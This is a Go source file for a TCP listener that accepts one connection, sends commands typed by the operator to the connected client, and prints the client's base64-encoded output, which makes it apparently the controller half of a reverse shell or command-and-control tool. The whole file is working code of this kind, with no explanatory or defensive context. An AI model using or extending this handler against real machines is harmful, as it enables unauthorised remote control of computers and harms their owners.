package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"net"
	"os"
	"strings"
)

func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide port number")
		return
	}

	PORT := ":" + arguments[1]
	l, err := net.Listen("tcp", PORT)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer l.Close()
	lport := strings.Replace(PORT, ":", "", -1)
	fmt.Println("[+] Listening on port " + string(lport))

	c, err := l.Accept()
	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print(c.RemoteAddr().String() + ">> ")
		text, _ := reader.ReadString('\n')
		fmt.Fprintf(c, text+"\n")
		// Decode client command output and print
		message, _ := bufio.NewReader(c).ReadString('\n')
		uDec, _ := b64.URLEncoding.DecodeString(message)
		fmt.Print("[+] Output from " + string(text) + "\n" + string(uDec))
		if strings.TrimSpace(string(text)) == "STOP" {
			fmt.Println("Disconnection from client...")
			return
		}
	}
}
